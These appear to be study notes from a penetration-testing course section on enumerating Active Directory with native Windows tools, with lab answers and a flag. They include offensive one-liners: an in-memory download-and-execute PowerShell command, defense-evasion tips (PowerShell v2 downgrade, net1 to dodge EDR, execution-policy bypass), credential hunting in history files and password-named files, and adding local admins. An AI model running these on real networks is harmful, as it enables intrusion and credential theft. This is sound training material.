# NOTE — Living Off the Land

## ID
551

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 16 — Living Off the Land

## Description
Enumerates an AD environment using only native Windows tools (PowerShell, WMI, net commands, dsquery) when no external tools can be loaded, covering host recon, defense checks, network mapping, and LDAP filtering.

## Tags
active-directory, living-off-the-land, lotl, dsquery, wmi, net-commands

## Commands
- `systeminfo`
- `Get-MpComputerStatus`
- `netsh advfirewall show allprofiles`
- `sc query windefend`
- `qwinsta`
- `powershell.exe -version 2`
- `wmic ntdomain list /format:list`
- `net localgroup Administrators`
- `net user <USERNAME> /domain`
- `net group "Domain Admins" /domain`
- `arp -a`
- `route print`
- `dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=<BITMASK>))" -attr distinguishedName userAccountControl`
- `dsquery user -name "<DISPLAY_NAME>" | dsget user -samid`

## What This Section Covers
Performing AD enumeration from a Windows host using only built-in tools when no external tools can be loaded (restricted/managed host, no internet). Covers host recon, defense evasion via PowerShell downgrade, firewall/AV status checks, network discovery, WMI queries, net commands, and dsquery with LDAP filters for targeted AD object searches.

## Methodology
1. Run `systeminfo` for a quick snapshot of OS, patches, domain, and network config in one command.
2. Check defenses: `Get-MpComputerStatus` for Defender status, `netsh advfirewall show allprofiles` for firewall state, `sc query windefend` to confirm Defender service is running.
3. Check who else is logged in with `qwinsta` — avoid alerting other users.
4. (Optional OPSEC) Downgrade PowerShell with `powershell.exe -version 2` to evade Script Block Logging (only works if PSv2 engine is still installed).
5. Enumerate network: `arp -a` for known hosts, `route print` for known networks and potential lateral movement paths, `ipconfig /all` for adapter details.
6. Use WMI for domain info: `wmic ntdomain list /format:list` reveals domain/child domain/forest trust info and DC addresses.
7. Use net commands for AD enumeration: `net group /domain` for groups, `net group "Domain Admins" /domain` for DA members, `net localgroup Administrators` for local admins, `net user <USER> /domain` for user details.
8. Use `net1` instead of `net` as an evasion trick — same functionality, may bypass string-based detection.
9. Use dsquery with LDAP filters for targeted searches: disabled accounts (`userAccountControl:1.2.840.113556.1.4.803:=2`), DCs (`=8192`), password not required (`=32`).
10. Pipe dsquery results to `dsget user -samid` to resolve display names to sAMAccountNames for use with net commands.

## Basic Enumeration Commands
| Command | Result |
|---------|--------|
| `hostname` | Prints the PC's Name |
| `[System.Environment]::OSVersion.Version` | Prints out the OS version and revision level |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Prints the patches and hotfixes applied to the host |
| `ipconfig /all` | Prints out network adapter state and configurations |
| `set` | Displays environment variables for the current session (CMD) |
| `echo %USERDOMAIN%` | Displays the domain name the host belongs to (CMD) |
| `echo %logonserver%` | Prints the DC the host checks in with (CMD) |
| `systeminfo` | All of the above in one command (OS, patches, domain, network) |

## PowerShell Recon Cmdlets
| Cmdlet | Description |
|--------|-------------|
| `Get-Module` | Lists available modules loaded for use |
| `Get-ExecutionPolicy -List` | Prints execution policy settings for each scope |
| `Set-ExecutionPolicy Bypass -Scope Process` | Changes policy for current process only (reverts on exit) |
| `Get-ChildItem Env: \| ft Key,Value` | Returns environment values (paths, users, computer info) |
| `Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` | Reads the user's PowerShell history — may contain passwords |
| `powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('<URL>'); <CMDS>"` | Download and execute file from web in memory |

## WMI Quick Reference
| Command | Description |
|---------|-------------|
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patch level and hotfixes |
| `wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` | Basic host info |
| `wmic process list /format:list` | All processes on host |
| `wmic ntdomain list /format:list` | Domain and DC info |
| `wmic useraccount list /format:list` | All local + logged-in domain accounts |
| `wmic group list /format:list` | All local groups |
| `wmic sysaccount list /format:list` | System/service accounts |

### Extended WMI (from xorrior gist)
```
# OS info
wmic os LIST Full
wmic computersystem LIST full

# Anti-Virus
wmic /namespace:\\root\securitycenter2 path antivirusproduct

# File search
wmic DATAFILE where "drive='C:' AND Name like '%password%'" GET Name,readable,size /VALUE

# Domain/DC info
wmic NTDOMAIN GET DomainControllerAddress,DomainName,Roles /VALUE

# List all domain users
wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname

# List all domain groups
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group GET ds_samaccountname

# Members of Domain Admins
wmic /NAMESPACE:\\root\directory\ldap PATH ds_group where "ds_samaccountname='Domain Admins'" Get ds_member /Value
# OR
wmic path win32_groupuser where (groupcomponent="win32_group.name=""domain admins"",domain=""YOURDOMAINHERE""")

# List all domain computers
wmic /NAMESPACE:\\root\directory\ldap PATH ds_computer GET ds_dnshostname

# Remote command execution
wmic process call create "cmd.exe /c calc.exe"

# Enable RDP remotely
wmic /node:remotehost path Win32_TerminalServiceSetting where AllowTSConnections="0" call SetAllowTSConnections "1"
```

## Net Commands Reference
| Command | Description |
|---------|-------------|
| `net accounts` | Password requirements |
| `net accounts /domain` | Domain password and lockout policy |
| `net group /domain` | List domain groups |
| `net group "Domain Admins" /domain` | List Domain Admin members |
| `net group "domain computers" /domain` | List PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List DC accounts |
| `net group <GROUP_NAME> /domain` | Members of a specific group |
| `net localgroup` | All local groups |
| `net localgroup Administrators` | Local admin group members |
| `net localgroup administrators /domain` | Domain users in local admins |
| `net localgroup administrators <USER> /add` | Add user to local admins |
| `net share` | Current shares |
| `net user <ACCOUNT> /domain` | Info about a domain user |
| `net user /domain` | List all domain users |
| `net user %username%` | Info about current user |
| `net use x: \\<COMPUTER>\<SHARE>` | Mount share locally |
| `net view` | List computers |
| `net view /all /domain[:<DOMAIN>]` | List shares on the domain |
| `net view \\<COMPUTER> /ALL` | List shares of a specific computer |
| `net view /domain` | List PCs of the domain |

> **OPSEC tip:** Use `net1` instead of `net` — same functionality, may bypass string-based EDR triggers.

## LDAP Filter Quick Reference
```
# Disabled accounts (UAC bit 2)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr distinguishedName userAccountControl

# Password not required (UAC bit 32)
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

# Domain Controllers (UAC bit 8192)
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

# Resolve display name → sAMAccountName
dsquery user -name "Betty Ross" | dsget user -samid
```

## OID Matching Rules
```
1.2.840.113556.1.4.803  →  Bitwise AND (ALL bits must match)
1.2.840.113556.1.4.804  →  Bitwise OR  (ANY bit can match)
1.2.840.113556.1.4.1941 →  LDAP_MATCHING_RULE_IN_CHAIN (recursive DN membership)
```

## LDAP Logical Operators
```
&   →  AND (all conditions must match)
|   →  OR  (any condition can match)
!   →  NOT (negate a condition)

# Example: users WHERE Password Can't Change
(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))

# Example: users WHERE Password CAN Change (negated)
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))

# Combine multiple: (&(condition1)(condition2)(condition3))
```

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: AMProductVersion? | 4.18.2109.6 | `Get-MpComputerStatus` → AMProductVersion field |
| Q2: Domain user in local Administrators? | adunn | `net localgroup Administrators` → listed as INLANEFREIGHT\adunn |
| Q3: Flag in disabled admin account description? | HTB{LD@P_I$_W1ld} | dsquery for disabled accounts (UAC bit 2) → find Betty Ross in IT Admins OU → `dsquery user -name "Betty Ross" \| dsget user -samid` → bross → `net user bross /domain` → Comment field |

## Key Takeaways
- `systeminfo` in one command gives you OS, patches, domain, network — fewer logs than running multiple commands individually.
- PowerShell downgrade to v2 bypasses Script Block Logging, but the downgrade command itself IS logged — defenders will see it happened even if they can't see what followed.
- `net1` is a drop-in replacement for `net` that may bypass simple string-based EDR triggers looking for "net.exe" commands.
- dsquery with LDAP bitwise filters is extremely powerful for finding specific account states (disabled, no password required, DCs) without needing PowerView or BloodHound.
- UAC bitmask values compound — a userAccountControl value of 66050 means multiple flags are set (e.g., NORMAL_ACCOUNT + ACCOUNTDISABLE + DONT_EXPIRE_PASSWORD). Use the OID match rules to query specific bits.
- `arp -a` and `route print` reveal known hosts and network segments — critical for identifying lateral movement opportunities, especially in black box assessments.
- dsquery only works from hosts with AD DS role installed or any modern Windows system (dsquery.dll exists at `C:\Windows\System32\dsquery.dll`), but requires elevated privileges or SYSTEM context.

## Gotchas
- PowerShell v2 downgrade only works if the PSv2 engine is still installed — many hardened environments have removed it.
- `net` commands are heavily monitored by EDR — running `net group "Domain Admins" /domain` from a marketing user's workstation is an instant red flag.
- dsquery returns the CN (display name), not the sAMAccountName — you must pipe through `dsget user -samid` before you can use the result with `net user /domain`.
- The Q3 flag required chaining three techniques: dsquery LDAP filter for disabled accounts → identify the one in an admin OU (Betty Ross in IT Admins) → resolve her sAMAccountName → net user to read the description field. No single command gets you there.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[15-credentialed-enum-windows]] | [[17-kerberoasting-linux]] →
<!-- AUTO-LINKS-END -->
